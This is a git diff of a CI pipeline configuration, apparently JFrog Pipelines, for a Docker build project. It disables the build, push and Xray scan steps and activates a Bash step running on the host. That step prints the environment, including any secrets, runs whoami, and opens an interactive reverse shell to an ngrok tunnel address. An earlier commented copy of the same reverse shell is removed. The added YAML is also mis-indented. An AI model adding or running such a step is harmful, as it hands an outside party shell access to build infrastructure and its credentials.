@@ -42,64 +42,66 @@ resources:
 pipelines:
   - name: yuval_pipeline_build_docker
     steps:
-      - name: docker_build_step
-        type: DockerBuild
-        configuration:
-          affinityGroup: yuval_docker
-          dockerFileLocation: .
-          dockerFileName: Dockerfile
-          dockerImageName: avigdor.jfrog.io/main-repohubvirt/ubuntu
-          dockerImageTag: ${run_number}
-          inputResources:
-            - name: yuval_repo
-            - name: docker_file
-          integrations:
-            - name: yuvalArtifactory
+#       - name: docker_build_step
+#         type: DockerBuild
+#         configuration:
+#           affinityGroup: yuval_docker
+#           dockerFileLocation: .
+#           dockerFileName: Dockerfile
+#           dockerImageName: avigdor.jfrog.io/main-repohubvirt/ubuntu
+#           dockerImageTag: ${run_number}
+#           inputResources:
+#             - name: yuval_repo
+#             - name: docker_file
+#           integrations:
+#             - name: yuvalArtifactory
             
-      #- name: bash_commands
-       # type: Bash
-        #configuration:
-         # affinityGroup: yuval_docker
-          #runtime:
-           # type: host
-         # inputSteps:
-          #  - name: docker_build_step
-        #execution:
-         # onExecute:
-          #  - pwd
-           # - whoami
-            #- bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/11712 0>&1
-          #onSuccess:
-           # - echo "succes"
-      
-      - name: docker_push
-        type: DockerPush
+      - name: bash_commands
+       type: Bash
         configuration:
-          affinityGroup: yuval_docker
-          targetRepository: main-repohub
-          integrations:   
-            - name: yuvalArtifactory                           # <-- new test replace with your     MyArtifactoryifactory integration
-          inputSteps:
-            - name: docker_build_step
-          outputResources:  
-            - name: image
-      
-      - name: build_info
-        type: PublishBuildInfo
-        configuration:
-          affinityGroup: yuval_docker
-          inputSteps:
-            - name: docker_push
-          outputResources:
-            - name: build_info
-      
-      - name: xray_scan
-        type: XrayScan
-        configuration:
-          failOnScan: false
-          inputResources:
-            - name: build_info
-          affinityGroup: yuval_docker
+         affinityGroup: yuval_docker
+          runtime:
+           type: host
+         inputSteps:
+           - name: docker_build_step
         execution:
+         onStart:
+           - env
+         onExecute:
+           - pwd
+           - whoami
+            - bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/15724 0>&1
           onSuccess:
-            - echo "succes to run Xray Scan"
+           - echo "succes"
+      
+#       - name: docker_push
+#         type: DockerPush
+#         configuration:
+#           affinityGroup: yuval_docker
+#           targetRepository: main-repohub
+#           integrations:   
+#             - name: yuvalArtifactory                           # <-- new test replace with your     MyArtifactoryifactory integration
+#           inputSteps:
+#             - name: docker_build_step
+#           outputResources:  
+#             - name: image
+      
+#       - name: build_info
+#         type: PublishBuildInfo
+#         configuration:
+#           affinityGroup: yuval_docker
+#           inputSteps:
+#             - name: docker_push
+#           outputResources:
+#             - name: build_info
+      
+#       - name: xray_scan
+#         type: XrayScan
+#         configuration:
+#           failOnScan: false
+#           inputResources:
+#             - name: build_info
+#           affinityGroup: yuval_docker
+#         execution:
+#           onSuccess:
+#             - echo "succes to run Xray Scan"
